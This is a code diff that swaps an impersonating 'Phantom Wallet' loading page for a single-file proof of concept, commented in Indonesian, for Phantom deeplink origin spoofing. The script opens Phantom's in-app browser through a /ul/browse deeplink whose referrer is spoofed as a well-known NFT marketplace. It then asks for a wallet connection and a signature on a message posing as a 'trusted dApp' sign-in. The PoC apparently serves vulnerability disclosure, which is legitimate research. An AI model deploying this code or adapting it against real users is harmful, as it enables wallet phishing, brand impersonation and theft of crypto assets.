@@ -1,17 +1,101 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Phantom Wallet</title>
-  <style>
-    body { font-family: sans-serif; text-align: center; background: #f5f2fd; }
-    img { width: 80px; margin-top: 40px; }
-    h1 { color: #5a31f4; }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Single-File PoC – Phantom Deeplink Origin Spoofing</title>
+<style>
+  body{font-family:system-ui,Segoe UI,Inter,Roboto,Arial,sans-serif;margin:22px;line-height:1.45}
+  .muted{color:#6b7280} .pill{display:inline-block;padding:4px 10px;border:1px solid #e5e7eb;border-radius:999px}
+  pre{background:#f3f4f6;border-radius:10px;padding:12px;overflow:auto}
+  button{padding:10px 14px;border:1px solid #e5e7eb;border-radius:10px;background:#f9fafb;cursor:pointer}
+</style>
+<!-- Solana web3 + bs58 hanya dipakai saat mode=target -->
+<script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/bs58@5.0.0/dist/bs58.min.js"></script>
 </head>
 <body>
-  <img src="https://docs.phantom.app/assets/phantom-icon-purple-842e5b50.svg" alt="Phantom Logo">
-  <h1>Connecting to your wallet…</h1>
-  <p>Waiting for MetaMask approval.</p>
+<h1>Single-File PoC – <span class="pill">/ul/browse</span></h1>
+<p class="muted">Catatan: origin di modal Connect Phantom selalu menampilkan <strong>origin sebenarnya</strong> dari halaman ini.</p>
+
+<div id="log" class="muted">Loading…</div>
+<pre id="env" style="display:none"></pre>
+<button id="retry" style="display:none">Buka Lagi di Phantom</button>
+
+<script>
+(async () => {
+  const log = m => (document.getElementById('log').textContent = m);
+  const qs = new URLSearchParams(location.search);
+  const mode = (qs.get('mode') || '').toLowerCase();
+
+  // Ganti ini untuk spoof brand yang diinginkan
+  const SPOOFED_REF = 'https://magiceden.io';
+
+  function buildTargetURL() {
+    const url = new URL(location.href);
+    url.searchParams.set('mode','target');
+    return url.toString();
+  }
+  function toDeeplink(target, ref) {
+    return `https://phantom.app/ul/browse/${encodeURIComponent(target)}?ref=${encodeURIComponent(ref)}`;
+  }
+
+  if (mode !== 'target') {
+    // MODE: LAUNCHER — auto buka Phantom dengan browse deeplink
+    const target = buildTargetURL();
+    const deeplink = toDeeplink(target, SPOOFED_REF);
+    log('Membuka Phantom… (jika tidak otomatis, klik tombol di bawah)');
+    const retry = document.getElementById('retry');
+    retry.style.display = 'inline-block';
+    retry.onclick = () => location.href = deeplink;
+
+    // Coba auto-redirect (mobile: akan meluncurkan app Phantom)
+    setTimeout(() => { location.href = deeplink; }, 200);
+    return;
+  }
+
+  // MODE: TARGET — halaman ini dibuka di in-app browser Phantom
+  const env = {
+    href: location.href,
+    origin: location.origin,
+    referrer: document.referrer || '(empty)',
+    userAgent: navigator.userAgent,
+    ts: new Date().toISOString()
+  };
+  document.getElementById('env').style.display = 'block';
+  document.getElementById('env').textContent = JSON.stringify(env, null, 2);
+
+  // Provider check
+  await new Promise(r => setTimeout(r, 600)); // beri waktu webview init
+  const hasPhantom = !!(window.solana && window.solana.isPhantom);
+  if (!hasPhantom) {
+    log('Phantom provider tidak terdeteksi. Buka halaman ini lewat deeplink / app Phantom.');
+    return;
+  }
+
+  // Auto-request Connect
+  log('Phantom terdeteksi — meminta Connect…');
+  try {
+    const res = await window.solana.connect({ onlyIfTrusted:false });
+    log('Connected: ' + res.publicKey.toString());
+
+    // Opsional: minta signMessage untuk bukti interaksi
+    const msg = 'Sign in to trusted dApp\nNonce=' + crypto.getRandomValues(new Uint32Array(1))[0];
+    const encoded = new TextEncoder().encode(msg);
+    const sig = await window.solana.signMessage(encoded, 'utf8');
+    const sigB58 = bs58.encode(sig.signature);
+
+    const out = {
+      event: 'signMessage',
+      message: msg,
+      publicKey: sig.publicKey?.toString?.(),
+      signature_b58: sigB58
+    };
+    document.getElementById('env').textContent += '\n\n' + JSON.stringify(out, null, 2);
+  } catch (e) {
+    log('Connect dibatalkan/gagal: ' + (e.message || e));
+  }
+})();
+</script>
 </body>
 </html>
